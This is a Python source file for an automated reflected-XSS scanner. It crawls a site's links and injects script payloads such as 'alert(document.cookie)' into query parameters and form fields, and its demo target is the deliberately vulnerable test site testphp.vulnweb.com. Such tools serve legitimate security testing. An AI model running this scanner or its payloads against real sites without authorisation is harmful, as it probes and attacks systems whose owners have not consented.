from random import randint
import requests
import time
import concurrent
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin,parse_qs,urlencode
from bs4 import BeautifulSoup
from scan import get_all_links


def generate_script():
    FUNCTION = [
        "prompt(5000/200)",
        "alert(6000/3000)",
        "alert(document.cookie)",
        "prompt(document.cookie)",
        "console.log(5000/3000)"
    ]

    return "<script>"+FUNCTION[randint(0, 4)]+"</script>"

def run_link_attack(url):

    query=urlparse(url).query
    payload = generate_script()
    

    if query != "":
        query_payload=query.replace(query[query.find("=")+1:len(query)],payload,1)
        test=url.replace(query,query_payload,1)

        query_all=url.replace(query,urlencode({x:payload for x in parse_qs(query)}))

        _respon=requests.get(test)

        if payload in _respon.text or payload in requests.get(query_all).text:
            
            return {'severity':'Medium','target_url':url,'vulnerable_url':_respon.url,'title':'XSS','method':'GET','description':f'XSS vulnerability found at vulnerable url with payload {payload}'}
       
    return None


def run_form_attack(resp):

    keys = {}
    payload=generate_script()

    for item in resp['field']:
        keys[item] = payload

    if resp['submit']:
        keys[resp['submit']]=resp['submit']

    if resp['method'] == 'post':
        req = requests.post(resp['action'], data=keys)
    
    else:
        req = requests.get(resp['action'], params=keys)
  
    if payload in req.text:
           
        return (True,keys)

    return (False,keys)


def run_xss(url):
    
    res = requests.get(url,timeout=5)
    bsObj = BeautifulSoup(res.content, "lxml")
    forms = bsObj.find_all("form", method=True)
    
    result=[]
    
    for form in forms:
        
        resp = {}
        try:

            if (form['action'].startswith('https') or form['action'].startswith('http')):
                resp["action"] = form["action"]
            else:
                resp["action"] = urljoin(url, form["action"])

        except KeyError:
            
            resp["action"] = res.url

        if form["method"].lower().strip() == "post":
            resp['method'] = 'post'
        else:
            resp['method'] = 'get'

        for key in form.find_all(["input", "textarea"]):
            try:
                if key.name == 'input'  and key['type']=='submit' and key['name']!='':
                    
                    resp['submit']=key['name']

                elif (key.name == 'textarea') or (key.name == 'input'):
                    
                    if 'field' not in resp:
                        resp['field'] = set()

                    resp['field'].add(key['name'])
                

            except Exception as e:
                print(e)
                continue

        try:
            
            ans =run_form_attack(resp)
            if ans[0]:

                result.append({'severity':'High','target_url':url,'vulnerable_url':resp['action'],'title':'XSS','method':resp['method'].upper(),'description':f'XSS vulnerability found at vulnerable url with payload {ans[1]}'})
        except:
            continue
    
    return result
    

def main(url):

    try:
        
        res = requests.get(url, timeout=5)
        
        resp=[]
        if res.status_code == 200:
            all_links=get_all_links(url)
            
            with ThreadPoolExecutor(max_workers=50) as executor:

                futures = [executor.submit(run_xss, link) for link in all_links]
                link_attack = [executor.submit(run_link_attack, link) for link in all_links]

                for future in concurrent.futures.as_completed(futures):
                    
                    ans = future.result()

                    if ans:
                    
                        resp.append(ans)
                
                for future in concurrent.futures.as_completed(link_attack):
                
                    ans = future.result()

                    if ans:
                        resp.append(ans)
        
            print('******************************* Response *************************')
            print(resp)
    except:
        print('******************************* Website is Down *************************')

if __name__ == "__main__":
    t=time.time()
    main('http://testphp.vulnweb.com/')
    print('Time is ',time.time()-t)




